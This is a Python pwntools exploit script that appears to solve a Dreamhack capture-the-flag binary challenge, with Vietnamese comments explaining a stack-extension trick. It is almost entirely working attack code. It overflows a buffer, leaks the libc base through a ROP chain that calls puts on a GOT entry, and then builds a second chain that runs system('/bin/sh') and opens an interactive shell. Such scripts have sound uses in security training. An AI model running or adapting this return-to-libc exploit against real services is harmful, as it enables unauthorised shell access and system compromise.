#!/usr/bin/python3 
from pwn import * 

exe = ELF('./prob_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		b* 0x00000000004014A9
		b* 0x0000000000401517
		c
		''')

HOST = "host8.dreamhack.games"
PORT = 19692 

if args.REMOTE:
	p = remote(HOST, PORT)
else:
	p = process(exe.path)

pop_rdi = 0x40129b
rw_section = 0x404500
#GDB()
#input()
sa(b'> ', b'Decision2Solve\0\0')
s(p64(exe.sym.safe))
s(p64((exe.sym.main))[:6])

sa(b'> ', b'1')	

for x in range(0x400):
	sa(b'> ', b'A' * 16)
	sa(b'> ', b'1')
sa(b'> ', b'A' * 16)
pld = b'A' * 0x28
pld += p64(pop_rdi) + p64(exe.got.puts)
pld += p64(rw_section) + p64(exe.plt.puts)
pld += p64(exe.sym.main + 175)
pld = pld.ljust(0x10000, b'\x00')
sa(b'> ', b'2')
s(pld)

libc.address = leak(r(6), libc.sym.puts)
info("Libc base: ",libc.address)

sa(b'> ', b'A' * 16)
sa(b'> ', b'2')
pld = flat(
	b'A' * 0x28,
	pop_rdi,
	next(libc.search(b'/bin/sh')),
	0, 
	pop_rdi + 3,
	pop_rdi + 3,
	libc.sym.system,
	)
pld = pld.ljust(0x10000, b'\x00')
s(pld)
p.interactive()
# extension stack (do input lớn nên phải mở rộng stack (input > 0x10000))
# gọi lên tục hàm main sau đó tính mỗi lần call main rsp trừ đi bao nhiêu 
# lấy 0x10000 / count -> số lượng main cần gọi
# nếu không mở rộng stack thì sẽ không đủ 